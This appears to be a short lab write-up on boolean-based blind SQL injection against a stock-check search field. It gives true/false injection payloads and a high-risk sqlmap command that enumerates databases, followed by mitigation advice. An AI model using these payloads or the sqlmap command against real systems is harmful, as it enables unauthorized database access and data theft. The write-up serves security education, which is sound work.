# Boolean-Based Blind SQL Injection

## 🎯 Objective
Extract database information through boolean-based blind SQL injection techniques.

## 🔍 Vulnerability Analysis
- **Type**: Boolean-Based Blind SQL Injection
- **Target**: Stock control system search functionality
- **Parameter**: Search field accepting user input
- **Indicator**: "Available in stock" vs "Not available in stock" responses
- **Impact**: Database information disclosure without direct output

## 💥 Exploitation

### Boolean Condition Testing
**True Condition**: `iphone11' AND '1'='1`
**Response**: "Available in stock"

**False Condition**: `iphone11' AND '1'='2`
**Response**: "Not available in stock"

### Automated Enumeration
```bash
sqlmap -u "https://target/" --data="search=iphone11" \
  --string="available in stock" \
  --level=5 --risk=3 -p search --dbs
Result: Successfully extracted database name: echo_store

🛡️ Mitigation Strategies
Parameterized Queries: Use prepared statements with bound parameters

Input Validation: Strict whitelist validation for all user inputs

Error Handling: Generic error messages without database details

Web Application Firewall: Implement WAF rules to detect SQLi patterns

📊 Skills Demonstrated
Blind Injection: Extracting data without direct output

Boolean Logic: Crafting conditional payloads for information extraction

Tool Proficiency: Using sqlmap with response-based detection flags

Patience and Precision: Methodical data extraction bit by bit

Conducted in controlled environment for educational purposes. All sensitive information (IPs, credentials, session tokens) has been sanitized for security.
